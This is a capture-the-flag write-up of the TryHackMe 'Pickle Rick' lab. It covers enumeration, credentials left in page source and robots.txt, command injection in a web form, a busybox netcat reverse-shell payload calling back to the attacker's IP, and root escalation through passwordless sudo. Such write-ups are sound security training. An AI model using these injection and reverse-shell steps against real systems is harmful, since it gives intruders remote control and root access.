---
title: "Pickle Rick - TryHackMe"
date: 2026-03-23 09:00:00 +0000
categories: [TryHackMe, Writeups]
tags: [ctf, web, command-injection, privilege-escalation]
---

# Pickle Rick - TryHackMe
![1.png](/assets/img/writeups/pickle-rick/1.png)
**Difficulty**: Easy<br>**Time Required**: 25 min
## Reconnaissance
Start enumeration using nmap with the following syntax<br> `nmap -sV 10.67.133.24 -p- -T4`
![2.png](/assets/img/writeups/pickle-rick/2.png)
A webserver is running on port 80.
![3.png](/assets/img/writeups/pickle-rick/3.png)
**View the page source and copy the username**
````
  <!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->
````
Now, using gobuster to enumerate directories.
`gobuster dir -u 10.67.133.24 -w /usr/share/wordlists/dirb/common.txt -t 60 -x php`
![4.png](/assets/img/writeups/pickle-rick/4.png)
### Findings
- login.php
- assets
- robotx.txt

Visit `10.67.133.24/robots.txt` and copy the password
````
Wubbalubbadubdub
````

Now, visist `10.67.133.24/login.php` and enter the credentials.
````
Username: R1ckRul3s
Password: Wubbalubbadubdub
````
![5.png](/assets/img/writeups/pickle-rick/5.png)
![6.png](/assets/img/writeups/pickle-rick/6.png)
The input field is vulnerable to command injection. Try injecting commands to reveal the content of `Sup3rS3cretPickl3Ingred.txt`.
The `cat` command is not allowed to use so try  `less`.
````
less Sup3rS3cretPickl3Ingred.txt
````

Next, escalate the attack by obtaining a reverse shell and gaining root privileges.
## Getting a Reverse Shell
Go to `https://www.revshells.com`, enter your machine’s IP address and a port, and generate a reverse shell payload.
![7.png](/assets/img/writeups/pickle-rick/7.png)
Set up a listener on your machine using `nc -lvnp 1234`.<br>Test multiple reverse shell payloads one by one. If the website hangs or stops responding, it likely indicates successful code execution, and you should receive a reverse shell. In this case, the working payload was:<br> `busybox nc 192.168.219.152 1234 -e sh`
![9.png](/assets/img/writeups/pickle-rick/9.png)
![8.png](/assets/img/writeups/pickle-rick/8.png)
After obtaining a reverse shell, begin searching for flags by exploring common directories such as home directories and root directory.
![10.png](/assets/img/writeups/pickle-rick/10.png)
We can use sudo to check permitted commands with `sudo -l`, which reveals that all commands can be executed without requiring a password.
````
User www-data may run the following commands on ip-10-66-191-31:
    (ALL) NOPASSWD: ALL
````
The `sudo -l` output shows that we can run all commands without a password, allowing us to switch to the root user using sudo su.
![11.png](/assets/img/writeups/pickle-rick/11.png)
